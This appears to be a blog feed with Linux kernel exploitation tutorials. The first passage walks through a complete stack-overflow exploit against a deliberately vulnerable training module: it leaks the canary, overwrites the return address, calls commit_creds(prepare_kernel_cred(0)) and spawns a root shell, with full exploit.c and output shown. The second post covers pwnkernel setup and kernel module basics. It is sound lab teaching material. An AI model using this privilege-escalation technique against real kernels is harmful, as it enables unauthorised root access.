&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
printf(&lt;span style="color:#e6db74">&amp;#34;0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, leak[i]);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>/home/ctf # ./exploit
0xffffffff81c00194
0xffffffff81c001a0
0xffffffff81aa85a0
0xffffffff81345d8b
0x4
0xffff888006bf5700
0x20000075a4070
0xffff888006bf5710
0x100020000
0x0
0xffff888000000000
0x0
0x0
0x0
0x0
0xa73ee2eeab3d9f00 &amp;lt;-- stack canary
0xa73ee2eeab3d9f00
0xffff888006bcd840 &amp;lt;-- return address
0xfffffffffffffffb
0xffffffff8123e347
0x1
0x0
0xffffffff811c89f8
0xffff888006bf5700
0xffff888006bf5700
0x7ffeeb3f3d10
0x100
0x0
0x0
0xffffffff811c8d1a
0x0
0xa73ee2eeab3d9f00
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> leak[&lt;span style="color:#ae81ff">15&lt;/span>];
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>];
payload[&lt;span style="color:#ae81ff">15&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" />
&lt;label for="2">
&lt;span class="collapsable-code__language">sh&lt;/span>
&lt;span class="collapsable-code__title">launch.sh&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-sh" >&lt;code>
#!/bin/bash
# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
popd
# launch
/usr/bin/qemu-system-x86_64 \
-kernel linux-5.4/arch/x86/boot/bzImage \
-initrd $PWD/initramfs.cpio.gz \
-fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
-nographic \
-monitor none \
-s \
-append &amp;#34;console=ttyS0 nokaslr quiet&amp;#34;
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
{
system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
save_user_space();
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
overflow_buffer(fd, canary);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/exploit.c">exploit.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
unsigned long save_ss, save_sp, save_rf, save_cs;
void shell()
{
system(&amp;#34;/bin/sh&amp;#34;);
}
void save_user_space()
{
/* save user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;mov save_ss, ss;&amp;#34;
&amp;#34;mov save_sp, rsp;&amp;#34;
&amp;#34;pushf;&amp;#34;
&amp;#34;pop save_rf;&amp;#34;
&amp;#34;mov save_cs, cs;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
}
void load_user_space(unsigned long target)
{
/* return to user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;swapgs;&amp;#34;
&amp;#34;mov r15, save_ss;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_sp;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_rf;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_cs;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, %[rip];&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;iretq;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
);
}
void escalate_privileges()
{
/* escalate privileges */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;xor rdi, rdi;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
&amp;#34;call rbx;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
&amp;#34;mov rdi, rax;&amp;#34;
&amp;#34;call rbx;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
/* return to user-space */
load_user_space((unsigned long)shell);
}
unsigned long leak_canary(int fd)
{
unsigned long leak[32];
read(fd, leak, sizeof(unsigned long) * 32);
return leak[15];
}
void overflow_buffer(int fd, unsigned long canary)
{
unsigned long payload[18];
payload[15] = canary;
payload[17] = (unsigned long)escalate_privileges;
write(fd, payload, sizeof(unsigned long) * 18);
}
int main(int argc, char **argv)
{
save_user_space();
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* leak stack canary */
unsigned long canary = leak_canary(fd);
printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
overflow_buffer(fd, canary);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
/ # uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x00 :: Kernel Module Interaction</title><link>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</link><pubDate>Wed, 19 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</guid><description>Table of Contents Environment Setup Debugging in the Kernel Kernel Module Overview Compiling Kernel Modules Inserting Kernel Modules Interacting with File-based Operations Interacting with IOCTL Environment Setup The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:
Downloading and building specific Kernel versions. Streamlining the kernel module build process.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#debugging-in-the-kernel">Debugging in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#kernel-module-overview">Kernel Module Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#compiling-kernel-modules">Compiling Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#inserting-kernel-modules">Inserting Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-file-based-operations">Interacting with File-based Operations&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interacting-with-ioctl">Interacting with IOCTL&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:&lt;/p>
&lt;ul>
&lt;li>Downloading and building specific Kernel versions.&lt;/li>
&lt;li>Streamlining the kernel module build process.&lt;/li>
&lt;li>Emulate specific kernel versions under the QEMU virtual machine.&lt;/li>
&lt;/ul>
&lt;p>Installation is pretty simple, just clone the repository and run the build script.&lt;/p>
&lt;pre>&lt;code>~/ $ git clone https://github.com/pwncollege/pwnkernel.git
Cloning into 'pwnkernel'...
remote: Enumerating objects: 115, done.
remote: Counting objects: 100% (115/115), done.
remote: Compressing objects: 100% (73/73), done.
remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0
Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done.
Resolving deltas: 100% (59/59), done.
&lt;/code>&lt;/pre>&lt;p>You can optionally specify the kernel version you want to download and compile within the &lt;code>build.sh&lt;/code> script. By default it should be Linux version 5.4.0.&lt;/p>
&lt;pre>&lt;code>~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
&lt;/code>&lt;/pre>&lt;p>Running the virtual machine is equally simple, it&amp;rsquo;s as easy as executing the &lt;code>launch.sh&lt;/code> script. Note that the target kernel version is specified within this script. After executing we can see we&amp;rsquo;re dropped into a shell inside the virtual machine.&lt;/p>
&lt;p>Note: by defauled pwnkernel launches the emulator without any kernel space protections (e.g. kpti, smap, smep, etc).&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="debugging-in-the-kernel">Debugging in the Kernel&lt;/h2>
&lt;p>First launch the kernel virtual machine in a separate terminal window.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;p>Then we need to open &lt;code>pwnkernel/linux-5.4/vmlinux&lt;/code> with GDB and we&amp;rsquo;ll be able to debug the kernel as we see fit. This will allow us to resolve kernel symbols and view kernel memory.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ gdb linux-5.4/vmlinux
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &amp;quot;show copying&amp;quot; and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.
Type &amp;quot;show configuration&amp;quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For help, type &amp;quot;help&amp;quot;.
Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from linux-5.4/vmlinux...
&lt;/code>&lt;/pre>&lt;p>By default the &lt;code>launch.sh&lt;/code> script will run QEMU with a gdbserver instance on port &lt;code>1234&lt;/code>. We can connect to this with the following command.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; target remote :1234
Remote debugging using :1234
default_idle () at arch/x86/kernel/process.c:581
&lt;/code>&lt;/pre>&lt;p>Then, debugging is almost identical to debugging any other binary - we can set breakpoints, step through code, etc. Keep in mind however, when the debugger is paused you will be unable to interact with the Kernel (i.e. enter any commands, etc) until you continue execution.&lt;/p>
&lt;h2 id="kernel-module-overview">Kernel Module Overview&lt;/h2>
&lt;p>Below is a code snippet containing the core parts of a kernel module. These include &lt;code>open&lt;/code>, &lt;code>release&lt;/code>, &lt;code>init_module&lt;/code>, and &lt;code>cleanup_module&lt;/code> functions.&lt;/p>
&lt;p>The &lt;code>init_module&lt;/code> function is called when the module is inserted into the kernel. It will typically create an entry under &amp;lsquo;/proc/&amp;rsquo; or &amp;lsquo;/dev/&amp;rsquo; that the user can interact with.&lt;/p>
&lt;p>The &lt;code>cleanup_module&lt;/code> function is called when the kernel module is removed from the kernel. It will typically remove whatever entry it created within the &lt;code>init_module&lt;/code> function logic.&lt;/p>
&lt;p>The &lt;code>open&lt;/code> function is called when the entry is opened for read/write operations. While the &lt;code>release&lt;/code> function is called when that entry is closed.&lt;/p>
&lt;p>The &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are also important for interacting with the kernel module, but more on these later.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// read from kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#75715e">// write to kernel space
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is opened
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#75715e">// when kernel module is released
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is inserted into the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#75715e">// when the module is removed from the kernel
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>One way to create a kernel module entry is to utilise the &lt;code>register_chrdev&lt;/code> function. This will assign what is called a &amp;lsquo;major number&amp;rsquo; to the kernel module, allowing us to create a kernel module entry under the &amp;lsquo;/dev/&amp;rsquo; directory. The &lt;code>unregister_chrdev&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
major_number &lt;span style="color:#f92672">=&lt;/span> register_chrdev(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">if&lt;/span> (major_number &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> major_number;
printk(KERN_INFO &lt;span style="color:#e6db74">&amp;#34;create device with: &amp;#39;mknod /dev/challenge c %d 0&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, major_number);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
unregister_chrdev(major_number, &lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can create an entry in the &amp;lsquo;/dev/&amp;rsquo; directory with the command below.&lt;/p>
&lt;pre>&lt;code>/ # mknod /dev/&amp;lt;module name&amp;gt; c &amp;lt;major number&amp;gt; 0
&lt;/code>&lt;/pre>&lt;p>An even simpler way to initialise a kernel module entry is via the &lt;code>proc_create&lt;/code> function. It creates a kernel module entry under the &amp;lsquo;/proc/&amp;rsquo; directory. It does not require any further user input to set up. The &lt;code>proc_remove&lt;/code> function is used to remove the kernel module entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> proc_dir_entry &lt;span style="color:#f92672">*&lt;/span>proc_entry;
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
proc_entry &lt;span style="color:#f92672">=&lt;/span> proc_create(&lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0666&lt;/span>, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">if&lt;/span> (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>While the &lt;code>read&lt;/code> and &lt;code>write&lt;/code> functions are often great for kernel module interaction, there is another utility that we can use if we need even greater control over our input, this being &lt;code>ioctl&lt;/code>.&lt;/p>
&lt;p>It takes two main arguments an &lt;code>ioctl_num&lt;/code> and an &lt;code>ioctl_param&lt;/code>, where the &lt;code>ioctl_num&lt;/code> can be used (for example) to specify various tasks, and the &lt;code>ioctl_param&lt;/code> can be used to provide something like a pointer to an array or struct.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">challenge_ioctl&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> ioctl_num, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> ioctl_param)
{
&lt;span style="color:#75715e">// when interacted with via ioctl
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.unlocked_ioctl &lt;span style="color:#f92672">=&lt;/span> challenge_ioctl,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="compiling-kernel-modules">Compiling Kernel Modules&lt;/h2>
&lt;p>As mentioned before, pwnkernel makes the process of compiling new kernel modules very simple. Just move your kernel module source code to the &amp;lsquo;src/&amp;rsquo; directory within pwnkernel. Make sure you update the makefile within the same &amp;lsquo;src/&amp;rsquo; directory, as this is what is used to compile your kernel module.&lt;/p>
&lt;p>See the below makefile for reference.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" />
&lt;label for="1">
&lt;span class="collapsable-code__language">makefile&lt;/span>
&lt;span class="collapsable-code__title">Makefile&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-makefile" >&lt;code>
# add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4
all:
echo $(OBJECTS)
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules
clean:
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After updating the makefile, building a new kernel module is as simple as running the below commands.&lt;/p>
&lt;pre>&lt;code>~/ $ mv challenge.c ~/pwnkernel/src/challenge.c
~/ $ mv Makefile ~/pwnkernel/src/challenge.c
~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
...
&lt;/code>&lt;/pre>&lt;h2 id="inserting-kernel-modules">Inserting Kernel Modules&lt;/h2>
&lt;p>Before you can interact with your freshly compiled kernel module, it needs to be inserted into the kernel itself. Below is a pre-written kernel module that will be used for the purposes of this exercise. Compile it and run the launch script to start.&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/5/challenge.c">challenge.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" checked />
&lt;label for="2">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
